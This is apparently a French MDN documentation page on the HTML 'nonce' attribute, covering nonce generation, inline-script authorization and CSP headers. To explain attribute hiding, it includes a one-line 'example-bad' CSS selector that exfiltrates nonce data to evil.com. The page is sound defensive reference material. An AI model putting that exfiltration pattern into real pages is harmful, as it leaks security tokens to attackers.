---
title: nonce
slug: Web/HTML/Global_attributes/nonce
---

{{HTMLSidebar("Global_attributes")}}

L'[attribut universel](/fr/docs/Web/HTML/Global_attributes) **`nonce`** est un attribut de contenu qui définit un nonce cryptographique pouvant être utilisé par une [règle de sécurité du contenu (CSP)](/fr/docs/Web/HTTP/CSP) afin de déterminer si la récupération d'un élément sera autorisée ou non.

## Description

L'attribut `nonce` permet d'autoriser certains éléments spécifiques (comme un script ou un style donné) en évitant d'avoir à utiliser la directive [CSP](/fr/docs/Web/HTTP/CSP) `unsafe-inline` qui autoriserait _tous_ les scripts ou styles embarqués.

> **Note :** `nonce` doit uniquement être utilisé pour les cas où il n'est pas possible de faire autrement que d'utiliser un script ou un style embarqué non sécurisé. Si vous n'avez pas besoin de `nonce`, il ne faut pas l'utiliser. Si votre script est statique, vous pouvez utiliser une empreinte (<i lang="en">hash</i>) CSP à la place (voir les notes d'utilisation sur [les scripts embarqués non sécurisés](/fr/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#scripts_embarqués_non_fiables).)
>
> Mieux vaut toujours exploiter les protections [CSP](/fr/docs/Web/HTTP/CSP) au maximum et donc éviter les nonces ou les scripts embarqués non sécurisés tant que possible.

### Utiliser `non` pour autoriser un élément &lt;script&gt;

Plusieurs étapes sont nécessaires afin d'utiliser un nonce pour autoriser un script embarqué.

#### Générer une valeur

Sur le serveur web, générez une chaîne de caractères encodées en base64 à partir de 128 bits de données générés par un générateur de nombres aléatoires cryptographique. Les nonces doivent être générés différemment à chaque chargement de la page. En Node.js par exemple, on pourra écrire&nbsp;:

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Autoriser le script embarqué

Le nonce généré côté serveur peut ensuite être utilisé sur le script embarqué qu'on souhaite autoriser&nbsp;:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  …
</script>
```

#### Envoyer le nonce avec un en-tête CSP

Enfin, il faut envoyer la valeur du nonce dans un en-tête [`Content-Security-Policy`](/fr/docs/Web/HTTP/Headers/Content-Security-Policy) en préfixant la chaîne de caractères avec `nonce-`&nbsp;:

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Masquage et accès au nonce

Pour des raisons de sécurité, le contenu de l'attribut `nonce` est masqué (c'est une chaîne vide qui sera renvoyé).

```js example-bad
script.getAttribute("nonce"); // renvoie la chaîne vide
```

La propriété [`nonce`](/fr/docs/Web/API/HTMLElement/nonce) est la seule façon d'accéder aux nonces&nbsp;:

```js example-good
script.nonce; // renvoie la valeur du nonce
```

Un tel masquage empêche des acteurs malveillants d'exfiltrer les données du nonce grâce à des mécanismes qui permettent d'accéder aux attributs comme&nbsp;:

```css example-bad
script[nonce~="peuimporte"] {
  background: url("https://evil.com/nonce?peuimporte");
}
```

## Spécifications

{{Specifications}}

## Compatibilité des navigateurs

{{Compat}}

## Voir aussi

- [`HTMLElement.nonce`](/fr/docs/Web/API/HTMLElement/nonce)
- [Stratégie de sécurité du contenu (<i lang="en">Content Security Policy</i>) (CSP)](/fr/docs/Web/HTTP/CSP)
- La directive CSP [`script-src`](/fr/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
